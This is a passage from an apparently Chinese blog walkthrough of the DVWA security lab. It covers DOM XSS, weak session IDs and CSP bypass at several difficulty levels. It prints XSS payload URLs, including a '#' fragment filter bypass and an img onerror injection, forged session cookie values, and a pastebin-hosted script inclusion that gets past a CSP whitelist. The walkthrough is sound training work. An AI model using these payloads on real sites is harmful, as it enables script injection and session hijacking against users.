mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $name = htmlspecialchars( $name );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );'</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':message'</span>, $message, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':name'</span>, $name, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从源码中，通过htmlspecialchars函数，解决了XSS，但是要注意的是，如果htmlspecialchars函数使用不当，攻击者可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。</p>
<h2 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS(DOM)"></a>XSS(DOM)</h2><p>DOM XSS与前面的两种xss的区别主要是:dom xss的产生并没有和后台服务器产生交互，而是通过浏览器的dom树解析产生的。</p>
<p>该部分参考：<a href="https://www.freebuf.com/articles/web/157953.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/157953.html</a></p>
<h3 id="Low-10"><a href="#Low-10" class="headerlink" title="Low"></a>Low</h3><p>服务器端没有源码，查看前端的源码，发现处理用户输入的只有前端的js代码：</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">	if (document.location.href.indexOf("default=") &gt;= 0) </span><span class="xquery">&#123;</span></span><br><span class="line"><span class="xquery">		var<span class="built_in"> lang</span> =<span class="built_in"> document</span>.location.href<span class="built_in">.substring</span><span class="built_in">(document</span>.location.href.indexOf(<span class="string">"default="</span>)+<span class="number">8</span>);</span></span><br><span class="line"><span class="xquery">	<span class="built_in">	document</span>.write(<span class="string">"&lt;option value='"</span> +<span class="built_in"> lang</span> + <span class="string">"'&gt;"</span> + decodeURI<span class="built_in">(lang</span>) + <span class="string">"&lt;/option&gt;"</span>);</span></span><br><span class="line"><span class="xquery">	<span class="built_in">	document</span>.write(<span class="string">"&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;"</span>);</span></span><br><span class="line"><span class="xquery">	&#125;</span></span><br><span class="line"><span class="xml">					    </span></span><br><span class="line"><span class="xml">	document.write("</span><span class="xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'English'</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><span class="xml">");</span></span><br><span class="line"><span class="xml">	document.write("</span><span class="xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'French'</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><span class="xml">");</span></span><br><span class="line"><span class="xml">	document.write("</span><span class="xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'Spanish'</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><span class="xml">");</span></span><br><span class="line"><span class="xml">	document.write("</span><span class="xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'German'</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><span class="xml">");</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>这边大约的方法是从选择列表选择的值赋值给default附加到url后，这段js代码将url中default的值赋给option标签的value属性节点和文本节点。</p>
<p>漏洞利用</p>
<p>构造payload：</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">172.18</span>.<span class="number">9.91</span>/DVWA-master/vulnerabilities/xss_d/?<span class="keyword">default</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>弹框成功，说明xss存在，浏览器在解析html dom树时会触发js弹框代码。</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/81.png" alt></p>
<h3 id="Medium-10"><a href="#Medium-10" class="headerlink" title="Medium"></a>Medium</h3><p>前端代码和low是一样的</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">	if (document.location.href.indexOf("default=") &gt;= 0) </span><span class="xquery">&#123;</span></span><br><span class="line"><span class="xquery">		var<span class="built_in"> lang</span> =<span class="built_in"> document</span>.location.href<span class="built_in">.substring</span><span class="built_in">(document</span>.location.href.indexOf(<span class="string">"default="</span>)+<span class="number">8</span>);</span></span><br><span class="line"><span class="xquery">	<span class="built_in">	document</span>.write(<span class="string">"&lt;option value='"</span> +<span class="built_in"> lang</span> + <span class="string">"'&gt;"</span> + decodeURI<span class="built_in">(lang</span>) + <span class="string">"&lt;/option&gt;"</span>);</span></span><br><span class="line"><span class="xquery">	<span class="built_in">	document</span>.write(<span class="string">"&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;"</span>);</span></span><br><span class="line"><span class="xquery">	&#125;</span></span><br><span class="line"><span class="xml">					    </span></span><br><span class="line"><span class="xml">	document.write("</span><span class="xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'English'</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><span class="xml">");</span></span><br><span class="line"><span class="xml">	document.write("</span><span class="xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'French'</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><span class="xml">");</span></span><br><span class="line"><span class="xml">	document.write("</span><span class="xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'Spanish'</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><span class="xml">");</span></span><br><span class="line"><span class="xml">	document.write("</span><span class="xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'German'</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><span class="xml">");</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>但是在后端对url的default参数值进行限制</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> Is there any input?</span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">'default'</span> ]) ) &#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">'default'</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (stripos (<span class="variable">$default</span>, <span class="string">"&lt;script"</span>) !== false) &#123;</span><br><span class="line">        header (<span class="string">"location: ?default=English"</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在服务器端不允许出现script标签，否则就会将default的值设为默认的English，stripos还防止了大小写绕过</p>
<p>漏洞利用</p>
<p>1.url中有一个字符为#，该字符数后的数据不会大送到服务器端，从而绕过服务其端过滤，构造playload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/DVWA-master/vulnerabilities/xss_d/?#default=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>成功绕过</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/82.png" alt></p>
<p>2.使用img标签或者其他标签的特性去执行js代码，比如img标签的onerror事件，构造playload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/DVWA-master/vulnerabilities/xss_d/?default=<span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>成功弹框</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/83.png" alt></p>
<p>要注意，在构建playload时要将option以及select标签进行闭合，并且img标签内的src属性值要为#，否则无法弹出弹框。这样做会破坏页面的结构，隐蔽性不如第一种方法。</p>
<h3 id="High-10"><a href="#High-10" class="headerlink" title="High"></a>High</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">'default'</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> ($_GET[<span class="string">'default'</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"French"</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"English"</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"German"</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"Spanish"</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            header (<span class="string">"location: ?default=English"</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在服务器后端的判断中，要求default的值必须是select选择菜单中的值，但是依旧可以使用Medium级别的方法#符号进行绕过，构造如下的playload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/DVWA-master/vulnerabilities/xss_d/?default=English#<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/84.png" alt></p>
<h2 id="Weak-Session-IDs-弱会话IDs"><a href="#Weak-Session-IDs-弱会话IDs" class="headerlink" title="Weak Session IDs(弱会话IDs)"></a>Weak Session IDs(弱会话IDs)</h2><p>该模块参考链接：<a href="https://blog.csdn.net/weixin_40950781/article/details/99933784" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40950781/article/details/99933784</a></p>
<p>Weak Session IDs，就是当用户登录后，在服务器就会创建一个会话（session），叫做会话控制，接着访问页面的时候就不用登录，只需要携带Sesion去访问，sessionID作为特定用户访问站点所需要的唯一内容，如果能够计算或轻易猜到该sessionID，则攻击者将可以轻易获取访问权限，无需登录直接进入特定用户界面，进而进行其他操作。用户访问服务器的时候，在服务器端会创建一个新的会话（Session），会话中会保存用户的状态和相关信息，用于标识用户。服务器端维护所有在线用户的Session，此时的认证，只需要知道是哪个用户在浏览当前的页面即可，为了告诉服务器应该使用哪个Session，浏览器需要将当前用户持有的SessionID告知服务器。用户拿到session id就会加密后保存到cookie上，之后只要cookie随着http请求发送服务器，服务器就知道是谁在访问。SessionID一旦在生命周期内被窃取，就等同于账户失窃。</p>
<p>session利用的实质：</p>
<p>由于SessionID是用户登录后才持有的唯一认证凭证，因此攻击者不需要在攻击登录过程（比如密码）就可以轻易获取访问权限，虚无登录密码直接进入特定用户界面，进而查找其他楼栋如XSS、文件上传等。</p>
<p>Session劫持：</p>
<p>就是一种通过窃取用户SessionID，使用该SessionID登录进目标账户的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。如果SessionID是保存在Cookie中的，则这种攻击可以成为Cookie劫持。SessionID还可以保存在URL中，作为一个请求的一个参数，凡是这种方式的安全性难以经受考验。</p>
<h3 id="Low-11"><a href="#Low-11" class="headerlink" title="Low"></a>Low</h3><p>服务器端源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> ($_SESSION[<span class="string">'last_session_id'</span>])) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'last_session_id'</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">'last_session_id'</span>]++;</span><br><span class="line">    $cookie_value = $_SESSION[<span class="string">'last_session_id'</span>];</span><br><span class="line">    setcookie(<span class="string">"dvwaSession"</span>, $cookie_value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在该级别中，源码显示若之前未登录，则置last_session_id为0，然后每登陆一次就将last_session_id加一。其余没有设置过滤。</p>
<p>漏洞利用：</p>
<p>burpsuite进行抓包：</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/85.png" alt></p>
<p>构造payload：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dvwaSession</span>=1; <span class="attribute">security</span>=low; <span class="attribute">PHPSESSID</span>=pge0humuj0s4vfsmrddu9r5i64</span><br></pre></td></tr></table></figure>

<p>为验证其有效性，清除浏览器的cookie值，提交后看是否能登陆，清除后浏览器登录会退出，此时将构造好的报文进行发送</p>
<p>发现是可以进行登录的，可能使用火狐浏览器的hackbar进行提交会比较明显</p>
<h3 id="Medium-11"><a href="#Medium-11" class="headerlink" title="Medium"></a>Medium</h3><p>服务器端源码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">$html = <span class="string">""</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) &#123;</span></span><br><span class="line"><span class="php">    $cookie_value = sha1(mt_rand() . time() . <span class="string">"Impossible"</span>);</span></span><br><span class="line"><span class="php">    setcookie(<span class="string">"dvwaSession"</span>, $cookie_value, time()+<span class="number">3600</span>, <span class="string">"/vulnerabilities/weak_id/"</span>, $_SERVER[<span class="string">'HTTP_HOST'</span>], <span class="keyword">true</span>, <span class="keyword">true</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>源码发现是通过时间戳生成的dvwaSession的，关于时间戳转换，可以查找转换器进行转化即可。转换地址：<a href="https://tool.lu/timestamp/" target="_blank" rel="noopener">https://tool.lu/timestamp/</a></p>
<p>漏洞利用</p>
<p>通过设置时间戳，可以诱骗受害者在某个时间点进行点击，抓包获取相应的报文，得到时间戳</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/86.png" alt></p>
<p>在线转换得到登录时间</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/87.png" alt></p>
<p>将报文中的cookie通过火狐的hackbar插件发送到服务器中，发现是直接登录的</p>
<h3 id="High-11"><a href="#High-11" class="headerlink" title="High"></a>High</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> ($_SESSION[<span class="string">'last_session_id_high'</span>])) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'last_session_id_high'</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">'last_session_id_high'</span>]++;</span><br><span class="line">    $cookie_value = md5($_SESSION[<span class="string">'last_session_id_high'</span>]);</span><br><span class="line">    setcookie(<span class="string">"dvwaSession"</span>, $cookie_value, time()+<span class="number">3600</span>, <span class="string">"/vulnerabilities/weak_id/"</span>, $_SERVER[<span class="string">'HTTP_HOST'</span>], <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>High级别使用PHP setcookie()函数，进行设置cookie，参数为</p>
<p>setcookie(name,value,expire,path,domain,secure,httponly)</p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">name</td>
<td align="center">必需，规定cookie名称</td>
</tr>
<tr>
<td align="center">value</td>
<td align="center">必需，规定cookie的值</td>
</tr>
<tr>
<td align="center">expire</td>
<td align="center">可选，规定cookie的有效期</td>
</tr>
<tr>
<td align="center">path</td>
<td align="center">可选，规定cookie的服务器路径</td>
</tr>
<tr>
<td align="center">domain</td>
<td align="center">可选，规定cookie的域名</td>
</tr>
<tr>
<td align="center">secure</td>
<td align="center">可选，规定是否通过安全的HTTPS连接来传输cookie</td>
</tr>
<tr>
<td align="center">httponly</td>
<td align="center">可选，规定是否Cookie仅可通过HTTP协议访问</td>
</tr>
</tbody></table>
<p>漏洞利用</p>
<p>抓包看到，dvwaSession值是MD5加密返回来的，使用md5解密，发现是对从零开始的整数进行加密，构造相应的playload使用火狐提交服务器可以绕过。</p>
<h3 id="Impossible-10"><a href="#Impossible-10" class="headerlink" title="Impossible"></a>Impossible</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">    $cookie_value = sha1(mt_rand() . time() . <span class="string">"Impossible"</span>);</span><br><span class="line">    setcookie(<span class="string">"dvwaSession"</span>, $cookie_value, time()+<span class="number">3600</span>, <span class="string">"/vulnerabilities/weak_id/"</span>, $_SERVER[<span class="string">'HTTP_HOST'</span>], <span class="keyword">true</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>$cookie_value采用随机数+时间戳+固定字符串“Impossible”，再进行sha1运算，若无法逆转该过程就无法构建相应的payload进行提交。</p>
<h2 id="CSP-Bypass"><a href="#CSP-Bypass" class="headerlink" title="CSP Bypass"></a>CSP Bypass</h2><p>该模块参考：<a href="https://blog.csdn.net/weixin_42555985/article/details/88382976" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42555985/article/details/88382976</a></p>
<p>CSP,即Content Security Policy(CSP)，内容(网页)安全策略，为了缓解潜在的跨站脚本问题（XSS攻击），浏览器的扩展程序系统引入内容安全策略（CSP）。在上面的XSS中，主要都是利用函数过滤/转义输入中的特殊字符，标签，文本来应对攻击。CSP则是另外一种常用的应对XSS攻击策略。</p>
<p>CSP的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以进行加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。</p>
<p>通过两种方法可启用CSP</p>
<ul>
<li>一种是通过HTTP响应头信息的Content-Security-Policy字段</li>
<li>一种是通过网页的标签</li>
</ul>
<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv="Content-Security-Policy" content="<span class="keyword">script-src</span> <span class="string">'self'</span>; <span class="keyword">object-src</span> <span class="string">'none'</span>; <span class="keyword">style-src</span> cdn.example.org third-party.org; <span class="keyword">child-src</span> https:"&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>script-src，脚本：只信任当前域名</li>
<li>object-src:不信任任何URL，即不加载任何资源</li>
<li>style-src，样式表：只信任cdn.example.org和third-party.org</li>
<li>child-src：必须使用https协议加载，这个已从web标准中删除，新版本浏览器可能不支持</li>
<li>其他资源：没有限制其他资源</li>
</ul>
<p>启用CSP后，不符合CSP的外部资源就会被阻止加载</p>
<h3 id="Low-12"><a href="#Low-12" class="headerlink" title="Low"></a>Low</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$headerCSP = <span class="string">"Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;"</span>; <span class="comment">// allows js from self, pastebin.com, jquery and google analytics.</span></span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://pastebin.com/raw/R570EE00</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_POST[<span class="string">'include'</span>])) &#123;</span><br><span class="line">$page[ <span class="string">'body'</span> ] .= <span class="string">"</span></span><br><span class="line"><span class="string">    &lt;script src='"</span> . $_POST[<span class="string">'include'</span>] . <span class="string">"'&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">'body'</span> ] .= <span class="string">'</span></span><br><span class="line"><span class="string">&lt;form name="csp" method="POST"&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input size="50" type="text" name="include" value="" id="include" /&gt;</span></span><br><span class="line"><span class="string">    &lt;input type="submit" value="Include" /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">'</span>;</span><br></pre></td></tr></table></figure>

<p>观察头部信息，罗列允许JavaScript的网站</p>
<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$headerCSP = "Content-Security-Policy: <span class="keyword">script-src</span> <span class="string">'self'</span> https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com</span><br></pre></td></tr></table></figure>

<p>在提交网页信息时，通过开发者工具也可以观察到同样的结果。</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/88.png" alt></p>
<p>此时可以上pastebin网站上写一个javascript代码alert(/hhhh/),生成相应的界面后，使用raw保存记住链接</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//pastebin.com/aGyf3ace</span></span><br></pre></td></tr></table></figure>

<p>然后在DVWA输入界面中输入链接，结果如下：</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/89.png" alt></p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/90.png" alt></p>
<p>这样就将pastebin上保存的js代码被执行了，因为pastebin网站是被信任的，攻击者可以把恶意代码保存在受信任的网站上，然后把链接发送给用户点击，实现注入。</p>
<h3 id="Medium-12"><a href="#Medium-12" class="headerlink" title="Medium"></a>Medium</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$headerCSP = <span class="string">"Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';"</span>;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Disable XSS protections so that inline alert boxes will work</span></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA="&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_POST[<span class="string">'include'</span>])) &#123;</span><br><span class="line">$page[ <span class="string">'body'</span> ] .= <span class="string">"</span></span><br><span class="line"><span class="string">    "</span> . $_POST[<span class="string">'include'</span>] . <span class="string">"</span></span><br><span class="line"><span 